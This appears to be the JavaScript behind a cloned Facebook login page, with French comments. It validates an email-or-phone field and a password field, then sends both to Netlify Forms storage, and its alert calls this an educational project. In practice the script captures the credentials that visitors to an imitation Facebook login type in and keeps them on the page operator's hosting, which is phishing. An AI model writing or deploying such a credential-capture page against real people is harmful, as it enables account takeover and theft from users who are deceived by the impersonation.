// Validation du formulaire de connexion Facebook
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    const emailInput = document.getElementById('name');
    const passwordInput = document.getElementById('password');

    // Fonction pour afficher un message d'erreur
    function showError(input, message) {
        // Supprimer l'ancien message d'erreur s'il existe
        const existingError = input.parentElement.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        // Ajouter la classe d'erreur à l'input
        input.classList.add('input-error');

        // Créer et afficher le message d'erreur
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        input.parentElement.appendChild(errorDiv);
    }

    // Fonction pour supprimer le message d'erreur
    function clearError(input) {
        input.classList.remove('input-error');
        const errorMessage = input.parentElement.querySelector('.error-message');
        if (errorMessage) {
            errorMessage.remove();
        }
    }

    // Validation de l'email ou du numéro de téléphone
    function validateEmailOrPhone(value) {
        if (!value || value.trim() === '') {
            return false;
        }

        // Regex pour email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        // Regex pour numéro de téléphone (format français et international)
        const phoneRegex = /^[\d\s\-\+\(\)]{8,}$/;

        return emailRegex.test(value) || phoneRegex.test(value);
    }

    // Validation du mot de passe
    function validatePassword(value) {
        return value && value.length >= 6;
    }

    // Validation en temps réel
    emailInput.addEventListener('blur', function() {
        if (!validateEmailOrPhone(this.value)) {
            showError(this, 'Veuillez entrer une adresse e-mail ou un numéro de téléphone valide.');
        }
    });

    emailInput.addEventListener('input', function() {
        if (this.value.trim() !== '') {
            clearError(this);
        }
    });

    passwordInput.addEventListener('blur', function() {
        if (!validatePassword(this.value)) {
            showError(this, 'Le mot de passe doit contenir au moins 6 caractères.');
        }
    });

    passwordInput.addEventListener('input', function() {
        if (this.value.length >= 6) {
            clearError(this);
        }
    });

    // Validation à la soumission du formulaire
    form.addEventListener('submit', function(e) {
        e.preventDefault();

        let isValid = true;

        // Valider l'email/téléphone
        if (!validateEmailOrPhone(emailInput.value)) {
            showError(emailInput, 'Veuillez entrer une adresse e-mail ou un numéro de téléphone valide.');
            isValid = false;
        } else {
            clearError(emailInput);
        }

        // Valider le mot de passe
        if (!validatePassword(passwordInput.value)) {
            showError(passwordInput, 'Le mot de passe doit contenir au moins 6 caractères.');
            isValid = false;
        } else {
            clearError(passwordInput);
        }

        // Si tout est valide, soumettre à Netlify Forms
        if (isValid) {
            // Soumettre via fetch pour Netlify Forms
            const formData = new FormData(form);

            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(formData).toString()
            })
            .then(response => {
                if (response.ok) {
                    // Succès : afficher un message et réinitialiser le formulaire
                    alert('Formulaire soumis avec succès ! (Projet éducatif - Les données sont stockées dans Netlify)');
                    form.reset();
                } else {
                    alert('Erreur lors de la soumission. Veuillez réessayer.');
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
                alert('Erreur de connexion. Veuillez réessayer.');
            });
        }
    });
});
